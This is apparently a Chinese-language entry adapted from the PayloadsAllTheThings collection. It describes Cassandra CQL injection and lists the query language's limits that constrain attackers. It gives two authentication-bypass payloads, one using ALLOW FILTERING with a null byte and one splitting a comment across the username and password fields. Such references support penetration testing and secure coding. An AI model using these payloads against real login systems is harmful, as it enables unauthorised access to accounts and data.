# Cassandra Injection - Cassandra注入攻击

[SEARCH_KEYWORDS]
漏洞类型: SQL Injection CQL Injection Cassandra NoSQL注入
攻击类型: Authentication Bypass Data Extraction Information Disclosure
关键词: Cassandra CQL NoSQL ALLOW FILTERING wide column
技术: Login Bypass Comment Injection Filter Bypass
限制: 无UNION 无JOIN 无OR 无SLEEP 无子查询

[CONTENT]

## Cassandra注入概述

Apache Cassandra是一个免费开源的分布式宽列存储NoSQL数据库管理系统。CQL(Cassandra Query Language)注入是一种针对Cassandra数据库的注入攻击。

## CQL注入限制

Cassandra作为非关系数据库，CQL存在以下限制：

- **无JOIN/UNION**: 不支持跨表查询
- **无内置元数据函数**: 缺少`DATABASE()`或`USER()`等函数
- **无OR运算符**: 无法创建永真条件
- **无SLEEP函数**: 难以执行时间盲注
- **无子查询**: 不支持嵌套语句

## Cassandra注释

```sql
/* Cassandra Comment */
```

## 登录绕过

### 示例1

```sql
username: admin' ALLOW FILTERING; %00
password: ANY
```

### 示例2

```sql
username: admin'/*
password: */and pass>'
```

生成的SQL查询：

```sql
SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;
```

## 参考文档

原始来源: PayloadsAllTheThings/SQL Injection/Cassandra Injection.md